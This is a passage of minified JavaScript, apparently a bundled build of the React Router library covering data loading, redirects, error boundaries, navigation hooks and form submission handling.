Xf(e.status,e.statusText,p),statusCode:e.status,headers:e.headers}:{type:"data",data:p,statusCode:e.status,headers:e.headers}}return n==="error"?mx(e)?e.data instanceof Error?{type:"error",error:e.data,statusCode:(i=e.init)==null?void 0:i.status,headers:(s=e.init)!=null&&s.headers?new Headers(e.init.headers):void 0}:{type:"error",error:new Xf(((o=e.init)==null?void 0:o.status)||500,void 0,e.data),statusCode:gd(e)?e.status:void 0,headers:(c=e.init)!=null&&c.headers?new Headers(e.init.headers):void 0}:{type:"error",error:e,statusCode:gd(e)?e.status:void 0}:mx(e)?{type:"data",data:e.data,statusCode:(d=e.init)==null?void 0:d.status,headers:(f=e.init)!=null&&f.headers?new Headers(e.init.headers):void 0}:{type:"data",data:e}}function GI(t,e,n,i,s){let o=t.headers.get("Location");if(tt(o,"Redirects returned/thrown from loaders/actions must have a Location header"),!bv.test(o)){let c=i.slice(0,i.findIndex(d=>d.route.id===n)+1);o=_0(new URL(e.url),c,s,o),t.headers.set("Location",o)}return t}function lx(t,e,n){if(bv.test(t)){let i=t,s=i.startsWith("//")?new URL(e.protocol+i):new URL(i),o=or(s.pathname,n)!=null;if(s.origin===e.origin&&o)return s.pathname+s.search+s.hash}return t}function Ql(t,e,n,i){let s=t.createURL(dT(e)).toString(),o={signal:n};if(i&&Pi(i.formMethod)){let{formMethod:c,formEncType:d}=i;o.method=c.toUpperCase(),d==="application/json"?(o.headers=new Headers({"Content-Type":d}),o.body=JSON.stringify(i.json)):d==="text/plain"?o.body=i.text:d==="application/x-www-form-urlencoded"&&i.formData?o.body=x0(i.formData):o.body=i.formData}return new Request(s,o)}function x0(t){let e=new URLSearchParams;for(let[n,i]of t.entries())e.append(n,typeof i=="string"?i:i.name);return e}function cx(t){let e=new FormData;for(let[n,i]of t.entries())e.append(n,i);return e}function YI(t,e,n,i=!1,s=!1){let o={},c=null,d,f=!1,p={},v=n&&Oi(n[1])?n[1].error:void 0;return t.forEach(b=>{if(!(b.route.id in e))return;let w=b.route.id,E=e[w];if(tt(!Oo(E),"Cannot handle redirect results in processLoaderData"),Oi(E)){let C=E.error;if(v!==void 0&&(C=v,v=void 0),c=c||{},s)c[w]=C;else{let M=Mo(t,w);c[M.route.id]==null&&(c[M.route.id]=C)}i||(o[w]=sT),f||(f=!0,d=gd(E.error)?E.error.status:500),E.headers&&(p[w]=E.headers)}else o[w]=E.data,E.statusCode&&E.statusCode!==200&&!f&&(d=E.statusCode),E.headers&&(p[w]=E.headers)}),v!==void 0&&n&&(c={[n[0]]:v},n[2]&&(o[n[2]]=void 0)),{loaderData:o,errors:c,statusCode:d||200,loaderHeaders:p}}function ux(t,e,n,i,s,o){let{loaderData:c,errors:d}=YI(e,n,i);return s.filter(f=>!f.matches||f.matches.some(p=>p.shouldLoad)).forEach(f=>{let{key:p,match:v,controller:b}=f,w=o[p];if(tt(w,"Did not find corresponding fetcher result"),!(b&&b.signal.aborted))if(Oi(w)){let E=Mo(t.matches,v==null?void 0:v.route.id);d&&d[E.route.id]||(d={...d,[E.route.id]:w.error}),t.fetchers.delete(p)}else if(Oo(w))tt(!1,"Unhandled fetcher revalidation redirect");else{let E=Ea(w.data);t.fetchers.set(p,E)}}),{loaderData:c,errors:d}}function dx(t,e,n,i){let s=Object.entries(e).filter(([,o])=>o!==sT).reduce((o,[c,d])=>(o[c]=d,o),{});for(let o of n){let c=o.route.id;if(!e.hasOwnProperty(c)&&t.hasOwnProperty(c)&&o.route.loader&&(s[c]=t[c]),i&&i.hasOwnProperty(c))break}return s}function hx(t){return t?Oi(t[1])?{actionData:{}}:{actionData:{[t[0]]:t[1].data}}:{}}function Mo(t,e){return(e?t.slice(0,t.findIndex(i=>i.route.id===e)+1):[...t]).reverse().find(i=>i.route.hasErrorBoundary===!0)||t[0]}function fx(t){let e=t.length===1?t[0]:t.find(n=>n.index||!n.path||n.path==="/")||{id:"__shim-error-route__"};return{matches:[{params:{},pathname:"",pathnameBase:"",route:e}],route:e}}function ir(t,{pathname:e,routeId:n,method:i,type:s,message:o}={}){let c="Unknown Server Error",d="Unknown @remix-run/router error";return t===400?(c="Bad Request",i&&e&&n?d=`You made a ${i} request to "${e}" but did not provide a \`loader\` for route "${n}", so there is no way to handle the request.`:s==="invalid-body"&&(d="Unable to encode submission body")):t===403?(c="Forbidden",d=`Route "${n}" does not match URL "${e}"`):t===404?(c="Not Found",d=`No route matches URL "${e}"`):t===405&&(c="Method Not Allowed",i&&e&&n?d=`You made a ${i.toUpperCase()} request to "${e}" but did not provide an \`action\` for route "${n}", so there is no way to handle the request.`:i&&(d=`Invalid request method "${i.toUpperCase()}"`)),new Xf(t||500,c,new Error(d),!0)}function bf(t){let e=Object.entries(t);for(let n=e.length-1;n>=0;n--){let[i,s]=e[n];if(Oo(s))return{key:i,result:s}}}function dT(t){let e=typeof t=="string"?$a(t):t;return Ua({...e,hash:""})}function QI(t,e){return t.pathname!==e.pathname||t.search!==e.search?!1:t.hash===""?e.hash!=="":t.hash===e.hash?!0:e.hash!==""}function KI(t){return hT(t.result)&&DI.has(t.result.status)}function Oi(t){return t.type==="error"}function Oo(t){return(t&&t.type)==="redirect"}function mx(t){return typeof t=="object"&&t!=null&&"type"in t&&"data"in t&&"init"in t&&t.type==="DataWithResponseInit"}function hT(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.headers=="object"&&typeof t.body<"u"}function WI(t){return kI.has(t.toUpperCase())}function Pi(t){return RI.has(t.toUpperCase())}function xv(t){return new URLSearchParams(t).getAll("index").some(e=>e==="")}function Ju(t,e){let n=typeof e=="string"?$a(e).search:e.search;if(t[t.length-1].route.index&&xv(n||""))return t[t.length-1];let i=nT(t);return i[i.length-1]}function px(t){let{formMethod:e,formAction:n,formEncType:i,text:s,formData:o,json:c}=t;if(!(!e||!n||!i)){if(s!=null)return{formMethod:e,formAction:n,formEncType:i,formData:void 0,json:void 0,text:s};if(o!=null)return{formMethod:e,formAction:n,formEncType:i,formData:o,json:void 0,text:void 0};if(c!==void 0)return{formMethod:e,formAction:n,formEncType:i,formData:void 0,json:c,text:void 0}}}function Wy(t,e){return e?{state:"loading",location:t,formMethod:e.formMethod,formAction:e.formAction,formEncType:e.formEncType,formData:e.formData,json:e.json,text:e.text}:{state:"loading",location:t,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0,json:void 0,text:void 0}}function $I(t,e){return{state:"submitting",location:t,formMethod:e.formMethod,formAction:e.formAction,formEncType:e.formEncType,formData:e.formData,json:e.json,text:e.text}}function Yu(t,e){return t?{state:"loading",formMethod:t.formMethod,formAction:t.formAction,formEncType:t.formEncType,formData:t.formData,json:t.json,text:t.text,data:e}:{state:"loading",formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0,json:void 0,text:void 0,data:e}}function XI(t,e){return{state:"submitting",formMethod:t.formMethod,formAction:t.formAction,formEncType:t.formEncType,formData:t.formData,json:t.json,text:t.text,data:e?e.data:void 0}}function Ea(t){return{state:"idle",formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0,json:void 0,text:void 0,data:t}}function ZI(t,e){try{let n=t.sessionStorage.getItem(rT);if(n){let i=JSON.parse(n);for(let[s,o]of Object.entries(i||{}))o&&Array.isArray(o)&&e.set(s,new Set(o||[]))}}catch{}}function JI(t,e){if(e.size>0){let n={};for(let[i,s]of e)n[i]=[...s];try{t.sessionStorage.setItem(rT,JSON.stringify(n))}catch(i){$t(!1,`Failed to save applied view transitions in sessionStorage (${i}).`)}}}function e6(){let t,e,n=new Promise((i,s)=>{t=async o=>{i(o);try{await n}catch{}},e=async o=>{s(o);try{await n}catch{}}});return{promise:n,resolve:t,reject:e}}var Xo=O.createContext(null);Xo.displayName="DataRouter";var Pd=O.createContext(null);Pd.displayName="DataRouterState";var Av=O.createContext({isTransitioning:!1});Av.displayName="ViewTransition";var fT=O.createContext(new Map);fT.displayName="Fetchers";var t6=O.createContext(null);t6.displayName="Await";var xr=O.createContext(null);xr.displayName="Navigation";var Qm=O.createContext(null);Qm.displayName="Location";var Ar=O.createContext({outlet:null,matches:[],isDataRoute:!1});Ar.displayName="Route";var Ev=O.createContext(null);Ev.displayName="RouteError";function n6(t,{relative:e}={}){tt(Rc(),"useHref() may be used only in the context of a <Router> component.");let{basename:n,navigator:i}=O.useContext(xr),{hash:s,pathname:o,search:c}=jd(t,{relative:e}),d=o;return n!=="/"&&(d=o==="/"?n:Qr([n,o])),i.createHref({pathname:d,search:c,hash:s})}function Rc(){return O.useContext(Qm)!=null}function bi(){return tt(Rc(),"useLocation() may be used only in the context of a <Router> component."),O.useContext(Qm).location}var mT="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function pT(t){O.useContext(xr).static||O.useLayoutEffect(t)}function cr(){let{isDataRoute:t}=O.useContext(Ar);return t?y6():i6()}function i6(){tt(Rc(),"useNavigate() may be used only in the context of a <Router> component.");let t=O.useContext(Xo),{basename:e,navigator:n}=O.useContext(xr),{matches:i}=O.useContext(Ar),{pathname:s}=bi(),o=JSON.stringify(Gm(i)),c=O.useRef(!1);return pT(()=>{c.current=!0}),O.useCallback((f,p={})=>{if($t(c.current,mT),!c.current)return;if(typeof f=="number"){n.go(f);return}let v=Ym(f,JSON.parse(o),s,p.relative==="path");t==null&&e!=="/"&&(v.pathname=v.pathname==="/"?e:Qr([e,v.pathname])),(p.replace?n.replace:n.push)(v,p.state,p)},[e,n,o,s,t])}var r6=O.createContext(null);function s6(t){let e=O.useContext(Ar).outlet;return e&&O.createElement(r6.Provider,{value:t},e)}function jd(t,{relative:e}={}){let{matches:n}=O.useContext(Ar),{pathname:i}=bi(),s=JSON.stringify(Gm(n));return O.useMemo(()=>Ym(t,JSON.parse(s),i,e==="path"),[t,s,i,e])}function a6(t,e,n,i){tt(Rc(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:s}=O.useContext(xr),{matches:o}=O.useContext(Ar),c=o[o.length-1],d=c?c.params:{},f=c?c.pathname:"/",p=c?c.pathnameBase:"/",v=c&&c.route;{let B=v&&v.path||"";gT(f,!v||B.endsWith("*")||B.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${f}" (under <Route path="${B}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${B}"> to <Route path="${B==="/"?"*":`${B}/*`}">.`)}let b=bi(),w;w=b;let E=w.pathname||"/",C=E;if(p!=="/"){let B=p.replace(/^\//,"").split("/");C="/"+E.replace(/^\//,"").split("/").slice(B.length).join("/")}let M=Ta(t,{pathname:C});return $t(v||M!=null,`No routes matched location "${w.pathname}${w.search}${w.hash}" `),$t(M==null||M[M.length-1].route.element!==void 0||M[M.length-1].route.Component!==void 0||M[M.length-1].route.lazy!==void 0,`Matched leaf route at location "${w.pathname}${w.search}${w.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`),d6(M&&M.map(B=>Object.assign({},B,{params:Object.assign({},d,B.params),pathname:Qr([p,s.encodeLocation?s.encodeLocation(B.pathname).pathname:B.pathname]),pathnameBase:B.pathnameBase==="/"?p:Qr([p,s.encodeLocation?s.encodeLocation(B.pathnameBase).pathname:B.pathnameBase])})),o,n,i)}function o6(){let t=g6(),e=gd(t)?`${t.status} ${t.statusText}`:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,i="rgba(200,200,200, 0.5)",s={padding:"0.5rem",backgroundColor:i},o={padding:"2px 4px",backgroundColor:i},c=null;return console.error("Error handled by React Router default ErrorBoundary:",t),c=O.createElement(O.Fragment,null,O.createElement("p",null," Hey developer "),O.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",O.createElement("code",{style:o},"ErrorBoundary")," or"," ",O.createElement("code",{style:o},"errorElement")," prop on your route.")),O.createElement(O.Fragment,null,O.createElement("h2",null,"Unexpected Application Error!"),O.createElement("h3",{style:{fontStyle:"italic"}},e),n?O.createElement("pre",{style:s},n):null,c)}var l6=O.createElement(o6,null),c6=class extends O.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,e){return e.location!==t.location||e.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 0?t.error:e.error,location:e.location,revalidation:t.revalidation||e.revalidation}}componentDidCatch(t,e){console.error("React Router caught the following error during render",t,e)}render(){return this.state.error!==void 0?O.createElement(Ar.Provider,{value:this.props.routeContext},O.createElement(Ev.Provider,{value:this.state.error,children:this.props.component})):this.props.children}};function u6({routeContext:t,match:e,children:n}){let i=O.useContext(Xo);return i&&i.static&&i.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=e.route.id),O.createElement(Ar.Provider,{value:t},n)}function d6(t,e=[],n=null,i=null){if(t==null){if(!n)return null;if(n.errors)t=n.matches;else if(e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let s=t,o=n==null?void 0:n.errors;if(o!=null){let f=s.findIndex(p=>p.route.id&&(o==null?void 0:o[p.route.id])!==void 0);tt(f>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(o).join(",")}`),s=s.slice(0,Math.min(s.length,f+1))}let c=!1,d=-1;if(n)for(let f=0;f<s.length;f++){let p=s[f];if((p.route.HydrateFallback||p.route.hydrateFallbackElement)&&(d=f),p.route.id){let{loaderData:v,errors:b}=n,w=p.route.loader&&!v.hasOwnProperty(p.route.id)&&(!b||b[p.route.id]===void 0);if(p.route.lazy||w){c=!0,d>=0?s=s.slice(0,d+1):s=[s[0]];break}}}return s.reduceRight((f,p,v)=>{let b,w=!1,E=null,C=null;n&&(b=o&&p.route.id?o[p.route.id]:void 0,E=p.route.errorElement||l6,c&&(d<0&&v===0?(gT("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),w=!0,C=null):d===v&&(w=!0,C=p.route.hydrateFallbackElement||null)));let M=e.concat(s.slice(0,v+1)),V=()=>{let B;return b?B=E:w?B=C:p.route.Component?B=O.createElement(p.route.Component,null):p.route.element?B=p.route.element:B=f,O.createElement(u6,{match:p,routeContext:{outlet:f,matches:M,isDataRoute:n!=null},children:B})};return n&&(p.route.ErrorBoundary||p.route.errorElement||v===0)?O.createElement(c6,{location:n.location,revalidation:n.revalidation,component:E,error:b,children:V(),routeContext:{outlet:null,matches:M,isDataRoute:!0}}):V()},null)}function Tv(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function h6(t){let e=O.useContext(Xo);return tt(e,Tv(t)),e}function f6(t){let e=O.useContext(Pd);return tt(e,Tv(t)),e}function m6(t){let e=O.useContext(Ar);return tt(e,Tv(t)),e}function Cv(t){let e=m6(t),n=e.matches[e.matches.length-1];return tt(n.route.id,`${t} can only be used on routes that contain a unique "id"`),n.route.id}function p6(){return Cv("useRouteId")}function g6(){var i;let t=O.useContext(Ev),e=f6("useRouteError"),n=Cv("useRouteError");return t!==void 0?t:(i=e.errors)==null?void 0:i[n]}function y6(){let{router:t}=h6("useNavigate"),e=Cv("useNavigate"),n=O.useRef(!1);return pT(()=>{n.current=!0}),O.useCallback(async(s,o={})=>{$t(n.current,mT),n.current&&(typeof s=="number"?t.navigate(s):await t.navigate(s,{fromRouteId:e,...o}))},[t,e])}var gx={};function gT(t,e,n){!e&&!gx[t]&&(gx[t]=!0,$t(!1,n))}var yx={};function vx(t,e){!t&&!yx[e]&&(yx[e]=!0,console.warn(e))}function v6(t){let e={hasErrorBoundary:t.hasErrorBoundary||t.ErrorBoundary!=null||t.errorElement!=null};return t.Component&&(t.element&&$t(!1,"You should not include both `Component` and `element` on your route - `Component` will be used."),Object.assign(e,{element:O.createElement(t.Component),Component:void 0})),t.HydrateFallback&&(t.hydrateFallbackElement&&$t(!1,"You should not include both `HydrateFallback` and `hydrateFallbackElement` on your route - `HydrateFallback` will be used."),Object.assign(e,{hydrateFallbackElement:O.createElement(t.HydrateFallback),HydrateFallback:void 0})),t.ErrorBoundary&&(t.errorElement&&$t(!1,"You should not include both `ErrorBoundary` and `errorElement` on your route - `ErrorBoundary` will be used."),Object.assign(e,{errorElement:O.createElement(t.ErrorBoundary),ErrorBoundary:void 0})),e}var _6=["HydrateFallback","hydrateFallbackElement"],w6=class{constructor(){this.status="pending",this.promise=new Promise((e,n)=>{this.resolve=i=>{this.status==="pending"&&(this.status="resolved",e(i))},this.reject=i=>{this.status==="pending"&&(this.status="rejected",n(i))}})}};function b6({router:t,flushSync:e}){let[n,i]=O.useState(t.state),[s,o]=O.useState(),[c,d]=O.useState({isTransitioning:!1}),[f,p]=O.useState(),[v,b]=O.useState(),[w,E]=O.useState(),C=O.useRef(new Map),M=O.useCallback((D,{deletedFetchers:Q,flushSync:G,viewTransitionOpts:L})=>{D.fetchers.forEach((T,k)=>{T.data!==void 0&&C.current.set(k,T.data)}),Q.forEach(T=>C.current.delete(T)),vx(G===!1||e!=null,'You provided the `flushSync` option to a router update, but you are not using the `<RouterProvider>` from `react-router/dom` so `ReactDOM.flushSync()` is unavailable.  Please update your app to `import { RouterProvider } from "react-router/dom"` and ensure you have `react-dom` installed as a dependency to use the `flushSync` option.');let N=t.window!=null&&t.window.document!=null&&typeof t.window.document.startViewTransition=="function";if(vx(L==null||N,"You provided the `viewTransition` option to a router update, but you do not appear to be running in a DOM environment as `window.startViewTransition` is not available."),!L||!N){e&&G?e(()=>i(D)):O.startTransition(()=>i(D));return}if(e&&G){e(()=>{v&&(f&&f.resolve(),v.skipTransition()),d({isTransitioning:!0,flushSync:!0,currentLocation:L.currentLocation,nextLocation:L.nextLocation})});let T=t.window.document.startViewTransition(()=>{e(()=>i(D))});T.finished.finally(()=>{e(()=>{p(void 0),b(void 0),o(void 0),d({isTransitioning:!1})})}),e(()=>b(T));return}v?(f&&f.resolve(),v.skipTransition(),E({state:D,currentLocation:L.currentLocation,nextLocation:L.nextLocation})):(o(D),d({isTransitioning:!0,flushSync:!1,currentLocation:L.currentLocation,nextLocation:L.nextLocation}))},[t.window,e,v,f]);O.useLayoutEffect(()=>t.subscribe(M),[t,M]),O.useEffect(()=>{c.isTransitioning&&!c.flushSync&&p(new w6)},[c]),O.useEffect(()=>{if(f&&s&&t.window){let D=s,Q=f.promise,G=t.window.document.startViewTransition(async()=>{O.startTransition(()=>i(D)),await Q});G.finished.finally(()=>{p(void 0),b(void 0),o(void 0),d({isTransitioning:!1})}),b(G)}},[s,f,t.window]),O.useEffect(()=>{f&&s&&n.location.key===s.location.key&&f.resolve()},[f,v,n.location,s]),O.useEffect(()=>{!c.isTransitioning&&w&&(o(w.state),d({isTransitioning:!0,flushSync:!1,currentLocation:w.currentLocation,nextLocation:w.nextLocation}),E(void 0))},[c.isTransitioning,w]);let V=O.useMemo(()=>({createHref:t.createHref,encodeLocation:t.encodeLocation,go:D=>t.navigate(D),push:(D,Q,G)=>t.navigate(D,{state:Q,preventScrollReset:G==null?void 0:G.preventScrollReset}),replace:(D,Q,G)=>t.navigate(D,{replace:!0,state:Q,preventScrollReset:G==null?void 0:G.preventScrollReset})}),[t]),B=t.basename||"/",Y=O.useMemo(()=>({router:t,navigator:V,static:!1,basename:B}),[t,V,B]);return O.createElement(O.Fragment,null,O.createElement(Xo.Provider,{value:Y},O.createElement(Pd.Provider,{value:n},O.createElement(fT.Provider,{value:C.current},O.createElement(Av.Provider,{value:c},O.createElement(E6,{basename:B,location:n.location,navigationType:n.historyAction,navigator:V},O.createElement(x6,{routes:t.routes,future:t.future,state:n})))))),null)}var x6=O.memo(A6);function A6({routes:t,future:e,state:n}){return a6(t,void 0,n,e)}function A0({to:t,replace:e,state:n,relative:i}){tt(Rc(),"<Navigate> may be used only in the context of a <Router> component.");let{static:s}=O.useContext(xr);$t(!s,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:o}=O.useContext(Ar),{pathname:c}=bi(),d=cr(),f=Ym(t,Gm(o),c,i==="path"),p=JSON.stringify(f);return O.useEffect(()=>{d(JSON.parse(p),{replace:e,state:n,relative:i})},[d,p,i,e,n]),null}function yT(t){return s6(t.context)}function E6({basename:t="/",children:e=null,location:n,navigationType:i="POP",navigator:s,static:o=!1}){tt(!Rc(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let c=t.replace(/^\/*/,"/"),d=O.useMemo(()=>({basename:c,navigator:s,static:o,future:{}}),[c,s,o]);typeof n=="string"&&(n=$a(n));let{pathname:f="/",search:p="",hash:v="",state:b=null,key:w="default"}=n,E=O.useMemo(()=>{let C=or(f,c);return C==null?null:{location:{pathname:C,search:p,hash:v,state:b,key:w},navigationType:i}},[c,f,p,v,b,w,i]);return $t(E!=null,`<Router basename="${c}"> is not able to match the URL "${f}${p}${v}" because it does not start with the basename, so the <Router> won't render anything.`),E==null?null:O.createElement(xr.Provider,{value:d},O.createElement(Qm.Provider,{children:e,value:E}))}var Pf="get",jf="application/x-www-form-urlencoded";function Km(t){return t!=null&&typeof t.tagName=="string"}function T6(t){return Km(t)&&t.tagName.toLowerCase()==="button"}function C6(t){return Km(t)&&t.tagName.toLowerCase()==="form"}function S6(t){return Km(t)&&t.tagName.toLowerCase()==="input"}function N6(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function R6(t,e){return t.button===0&&(!e||e==="_self")&&!N6(t)}function E0(t=""){return new URLSearchParams(typeof t=="string"||Array.isArray(t)||t instanceof URLSearchParams?t:Object.keys(t).reduce((e,n)=>{let i=t[n];return e.concat(Array.isArray(i)?i.map(s=>[n,s]):[[n,i]])},[]))}function I6(t,e){let n=E0(t);return e&&e.forEach((i,s)=>{n.has(s)||e.getAll(s).forEach(o=>{n.append(s,o)})}),n}var xf=null;function k6(){if(xf===null)try{new FormData(document.createElement("form"),0),xf=!1}catch{xf=!0}return xf}var D6=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function $y(t){return t!=null&&!D6.has(t)?($t(!1,`"${t}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${jf}"`),null):t}function M6(t,e){let n,i,s,o,c;if(C6(t)){let d=t.getAttribute("action");i=d?or(d,e):null,n=t.getAttribute("method")||Pf,s=$y(t.getAttribute("enctype"))||jf,o=new FormData(t)}else if(T6(t)||S6(t)&&(t.type==="submit"||t.type==="image")){let d=t.form;if(d==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let f=t.getAttribute("formaction")||d.getAttribute("action");if(i=f?or(f,e):null,n=t.getAttribute("formmethod")||d.getAttribute("method")||Pf,s=$y(t.getAttribute("formenctype"))||$y(d.getAttribute("enctype"))||jf,o=new FormData(d,t),!k6()){let{name:p,type:v,value:b}=t;if(v==="image"){let w=p?`${p}.`:"";o.append(`${w}x`,"0"),o.append(`${w}y`,"0")}else p&&o.append(p,b)}}else{if(Km(t))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');n=Pf,i=null,s=jf,c=t}return o&&s==="text/plain"&&(c=o,o=void 0),{action:i,method:n.toLowerCase(),encType:s,formData:o,body:c}}function Sv(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}async function O6(t,e){if(t.id in e)return e[t.id];try{let n=await import(t.module);return e[t.id]=n,n}catch(n){return console.error(`Error loading route module \`${t.module}\`, reloading page...`),console.error(n),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function P6(t){return t==null?!1:t.href==null?t.rel==="preload"&&typeof t.imageSrcSet=="string"&&typeof t.imageSizes=="string":typeof t.rel=="string"&&typeof t.href=="string"}async function j6(t,e,n){let i=await Promise.all(t.map(async s=>{let o=e.routes[s.route.id];if(o){let c=await O6(o,n);return c.links?c.links():[]}return[]}));return B6(i.flat(1).filter(P6).filter(s=>s.rel==="stylesheet"||s.rel==="preload").map(s=>s.rel==="stylesheet"?{...s,rel:"prefetch",as:"style"}:{...s,rel:"prefetch"}))}function _x(t,e,n,i,s,o){let c=(f,p)=>n[p]?f.route.id!==n[p].route.id:!0,d=(f,p)=>{var v;return n[p].pathname!==f.pathname||((v=n[p].route.path)==null?void 0:v.endsWith("*"))&&n[p].params["*"]!==f.params["*"]};return o==="assets"?e.filter((f,p)=>c(f,p)||d(f,p)):o==="data"?e.filter((f,p)=>{var b;let v=i.routes[f.route.id];if(!v||!v.hasLoader)return!1;if(c(f,p)||d(f,p))return!0;if(f.route.shouldRevalidate){let w=f.route.shouldRevalidate({currentUrl:new URL(s.pathname+s.search+s.hash,window.origin),currentParams:((b=n[0])==null?void 0:b.params)||{},nextUrl:new URL(t,window.origin),nextParams:f.params,defaultShouldRevalidate:!0});if(typeof w=="boolean")return w}return!0}):[]}function L6(t,e,{includeHydrateFallback:n}={}){return V6(t.map(i=>{let s=e.routes[i.route.id];if(!s)return[];let o=[s.module];return s.clientActionModule&&(o=o.concat(s.clientActionModule)),s.clientLoaderModule&&(o=o.concat(s.clientLoaderModule)),n&&s.hydrateFallbackModule&&(o=o.concat(s.hydrateFallbackModule)),s.imports&&(o=o.concat(s.imports)),o}).flat(1))}function V6(t){return[...new Set(t)]}function U6(t){let e={},n=Object.keys(t).sort();for(let i of n)e[i]=t[i];return e}function B6(t,e){let n=new Set;return new Set(e),t.reduce((i,s)=>{let o=JSON.stringify(U6(s));return n.has(o)||(n.add(o),i.push({key:o,link:s})),i},[])}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var z6=new Set([100,101,204,205]);function F6(t,e){let n=typeof t=="string"?new URL(t,typeof window>"u"?"server://singlefetch/":window.location.origin):t;return n.pathname==="/"?n.pathname="_root.data":e&&or(n.pathname,e)==="/"?n.pathname=`${e.replace(/\/$/,"")}/_root.data`:n.pathname=`${n.pathname.replace(/\/$/,"")}.data`,n}function vT(){let t=O.useContext(Xo);return Sv(t,"You must render this element inside a <DataRouterContext.Provider> element"),t}function H6(){let t=O.useContext(Pd);return Sv(t,"You must render this element inside a <DataRouterStateContext.Provider> element"),t}var Nv=O.createContext(void 0);Nv.displayName="FrameworkContext";function _T(){let t=O.useContext(Nv);return Sv(t,"You must render this element inside a <HydratedRouter> element"),t}function q6(t,e){let n=O.useContext(Nv),[i,s]=O.useState(!1),[o,c]=O.useState(!1),{onFocus:d,onBlur:f,onMouseEnter:p,onMouseLeave:v,onTouchStart:b}=e,w=O.useRef(null);O.useEffect(()=>{if(t==="render"&&c(!0),t==="viewport"){let M=B=>{B.forEach(Y=>{c(Y.isIntersecting)})},V=new IntersectionObserver(M,{threshold:.5});return w.current&&V.observe(w.current),()=>{V.disconnect()}}},[t]),O.useEffect(()=>{if(i){let M=setTimeout(()=>{c(!0)},100);return()=>{clearTimeout(M)}}},[i]);let E=()=>{s(!0)},C=()=>{s(!1),c(!1)};return n?t!=="intent"?[o,w,{}]:[o,w,{onFocus:Qu(d,E),onBlur:Qu(f,C),onMouseEnter:Qu(p,E),onMouseLeave:Qu(v,C),onTouchStart:Qu(b,E)}]:[!1,w,{}]}function Qu(t,e){return n=>{t&&t(n),n.defaultPrevented||e(n)}}function G6({page:t,...e}){let{router:n}=vT(),i=O.useMemo(()=>Ta(n.routes,t,n.basename),[n.routes,t,n.basename]);return i?O.createElement(Q6,{page:t,matches:i,...e}):null}function Y6(t){let{manifest:e,routeModules:n}=_T(),[i,s]=O.useState([]);return O.useEffect(()=>{let o=!1;return j6(t,e,n).then(c=>{o||s(c)}),()=>{o=!0}},[t,e,n]),i}function Q6({page:t,matches:e,...n}){let i=bi(),{manifest:s,routeModules:o}=_T(),{basename:c}=vT(),{loaderData:d,matches:f}=H6(),p=O.useMemo(()=>_x(t,e,f,s,i,"data"),[t,e,f,s,i]),v=O.useMemo(()=>_x(t,e,f,s,i,"assets"),[t,e,f,s,i]),b=O.useMemo(()=>{if(t===i.pathname+i.search+i.hash)return[];let C=new Set,M=!1;if(e.forEach(B=>{var D;let Y=s.routes[B.route.id];!Y||!Y.hasLoader||(!p.some(Q=>Q.route.id===B.route.id)&&B.route.id in d&&((D=o[B.route.id])!=null&&D.shouldRevalidate)||Y.hasClientLoader?M=!0:C.add(B.route.id))}),C.size===0)return[];let V=F6(t,c);return M&&C.size>0&&V.searchParams.set("_routes",e.filter(B=>C.has(B.route.id)).map(B=>B.route.id).join(",")),[V.pathname+V.search]},[c,d,i,s,p,e,t,o]),w=O.useMemo(()=>L6(v,s),[v,s]),E=Y6(v);return O.createElement(O.Fragment,null,b.map(C=>O.createElement("link",{key:C,rel:"prefetch",as:"fetch",href:C,...n})),w.map(C=>O.createElement("link",{key:C,rel:"modulepreload",href:C,...n})),E.map(({key:C,link:M})=>O.createElement("link",{key:C,...M})))}function K6(...t){return e=>{t.forEach(n=>{typeof n=="function"?n(e):n!=null&&(n.current=e)})}}var wT=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{wT&&(window.__reactRouterVersion="7.6.1")}catch{}function W6(t,e){return jI({basename:e==null?void 0:e.basename,unstable_getContext:e==null?void 0:e.unstable_getContext,future:e==null?void 0:e.future,history:iI({window:e==null?void 0:e.window}),hydrationData:$6(),routes:t,mapRouteProperties:v6,hydrationRouteProperties:_6,dataStrategy:e==null?void 0:e.dataStrategy,patchRoutesOnNavigation:e==null?void 0:e.patchRoutesOnNavigation,window:e==null?void 0:e.window}).initialize()}function $6(){let t=window==null?void 0:window.__staticRouterHydrationData;return t&&t.errors&&(t={...t,errors:X6(t.errors)}),t}function X6(t){if(!t)return null;let e=Object.entries(t),n={};for(let[i,s]of e)if(s&&s.__type==="RouteErrorResponse")n[i]=new 